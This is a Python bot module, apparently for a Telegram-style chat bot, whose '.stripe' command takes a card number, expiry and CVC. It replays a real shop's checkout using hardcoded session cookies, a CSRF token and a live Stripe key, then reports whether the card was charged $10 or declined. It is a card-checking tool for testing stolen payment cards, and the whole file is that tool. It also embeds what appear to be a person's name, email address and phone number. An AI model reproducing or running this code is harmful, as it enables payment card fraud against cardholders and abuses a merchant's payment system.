from requests import get, post

from ._handler import newMsg


def get_uuid(cc, exp, cvc):
    """
    Get stripe response
    """
    cookies = {
        "INGRESSCOOKIE": "00C34381A0D27785093E0679AB863AD6",
        "tmdp_stats": "1656405676890",
        "__stripe_mid": "47e59e06-5eb4-4f06-b6a7-0826a0599191f7b754",
        "__stripe_sid": "b4b5c4b2-d35f-41ba-a831-a4d5a9ad1e6f50194e",
        "site_member": "goWo0OduU2EptVfT%3A3HniZNtnww8O0U2z",
        "_csrfToken": "xHQkS7-uMOtLd-JzLzaN",
    }

    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    }

    data = {
        "action": "completeOrder",
        "_csrfToken": "xHQkS7-uMOtLd-JzLzaN",
        "r": "0.35336036552543804",
        "method": "stripe",
        "token": "",
        "order_extra": "x1vayUOqiC/s4DXT0XrKrhKcVXDoKvAot5ffCZI7wCrFh9EqQ1ke4twvK0juchBGhcZqKFrcMm38pa1wuH9yx4asdcmEBxBdt+FaeaAixaSV/p2T+bvKhIWOTFYOQhoQlqCNBeoUCjblcfYsz0bD8A2TQmQNxUPPY0gCazdFQUHaX2SgsC+UGuMOKWd3GnsLbGAN/oVfnqNGvyiIee3OAYuBMXgSsVfs+ewpKx+yPToja4XBN5/1A0SkeyTA1EuIjsUdCkVj8UqSc7q5/LhbzcQ9t+1tY+S+/Am5UfEhQutrFTYrUi6YyA+3sANpnt4O97CUiZ706ToLbMcKI2T3/gEoXCExKaZG1GBvAWnXVC05cnKmLErP1MycMbFJwcrcIZgjcPjA92F8i5qiLe5BZA==",
        "resubmit": "false",
        "orderId": "91420927",
        "products": "[14]",
        "funnel": "",
        "funnelStep": "",
        "funnelStepVariant": "",
        "fields": "billing,registration,country,city",
        "withAddress": "true",
        "name": "Jenna Marie Ortega",
        "email": "amarnathc@outlook.in",
        "shippingPhone": "8643892149",
        "shippingAddress": "",
        "shippingCity": "",
        "shippingZipCode": "",
        "shippingCountry": "US",
        "shippingState": "New York",
        "billingAddress": "",
        "billingCity": "",
        "billingState": "New York",
        "billingZipCode": "",
        "billingCountry": "US",
        "billingPhone": "",
        "new_password": "",
        "new_password_repeat": "",
        "values[]": "Jenna K Lodu",
    }
    response = get(
        "https://martialartsolympia.com/clientRequestHandler/",
        cookies=cookies,
        headers=headers,
        params=data,
    )
    resp = response.json()
    print(resp)
    stripe_data = resp["data"]["payload"]["extra"][0]
    exp_month = exp.split("/")[0]
    exp_year = exp.split("/")[1]
    stripe_data_json = "payment_method_data[type]=card&payment_method_data[billing_details][name]=Jenna+Marie+Ortega&payment_method_data[card][number]={}&payment_method_data[card][cvc]={}&payment_method_data[card][exp_month]={}&payment_method_data[card][exp_year]={}&payment_method_data[guid]=5ae24269-2519-4940-bace-5b645b6995b0af3df7&payment_method_data[muid]=47e59e06-5eb4-4f06-b6a7-0826a0599191f7b754&payment_method_data[sid]=b4b5c4b2-d35f-41ba-a831-a4d5a9ad1e6f50194e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fe63c37019%3B+stripe-js-v3%2Fe63c37019&payment_method_data[time_on_page]=523674&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_cCVty8fzuqPjQVMEouZHvxSM00fJ118Itq&client_secret={}".format(
        cc, cvc, exp_month, exp_year, stripe_data
    )
    req = post(
        "https://api.stripe.com/v1/payment_intents/"
        + stripe_data.split("_secret")[0]
        + "/confirm",
        headers={"content-type": "application/x-www-form-urlencoded"},
        data=stripe_data_json,
    )
    resp = req.json()
    if "error" in resp:
        err = resp["error"]
        return "declined", err.get("code"), err.get("decline_code"), err.get("message")
    else:
        return "success", "", "", ""


@newMsg(pattern="stripe")
async def _stripe(e):
    try:
        arg = e.text.split(" ", 1)[1]
    except IndexError:
        await e.reply("`Usage: .stripe <card number> <cvc> <exp>`")
        return
    message = await e.reply("`Processing...`")
    cc, exp_mo, exp_year, cvv = arg.split("|", 3)
    exp = exp_mo + "/" + exp_year
    cc = cc.replace(" ", "")
    result, code, decline_code, msg = get_uuid(cc, exp, cvv)
    if result == "success":
        msg = """
        ```Card has been successfully charged.```
        card: ```{}```
        amount: ```$10.00```
        gateway: ```Stripe```
        status: ```Success```
        """.format(
            cc
        )
    else:
        msg = """
        ```Card has been declined.```
        card: ```{}```
        message: ```{}```
        code: ```{}```
        decline_code: ```{}```
        gateway: ```stripe```
        status: ```Declined```
        """.format(
            cc, msg, code, decline_code
        )
    await message.edit(msg)
